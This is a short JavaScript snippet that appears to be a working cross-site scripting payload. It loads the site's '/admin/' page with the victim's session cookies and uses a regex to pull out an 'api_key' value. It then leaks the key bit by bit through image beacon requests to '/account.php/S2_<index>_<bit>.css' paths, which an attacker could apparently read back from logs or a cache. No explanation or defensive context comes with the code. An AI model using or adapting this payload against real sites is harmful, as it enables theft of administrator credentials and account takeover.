(function () {
  function b(n) { new Image().src = '/account.php/' + n + '.css'; }
  b('S2_alive');
  fetch('/admin/', { credentials: 'include' })
    .then(function (r) { return r.text(); })
    .then(function (t) {
      var m = t.match(/api_key=([A-Za-z0-9_\-]+)/i);
      if (!m) { b('S2_nokey'); return; }
      var k = m[1];
      for (var i = 0; i < k.length; i++) {
        var c = k.charCodeAt(i);
        for (var j = 0; j < 8; j++) if (c & (1 << j)) b('S2_' + i + '_' + j);
      }
      b('S2_done');
    });
})();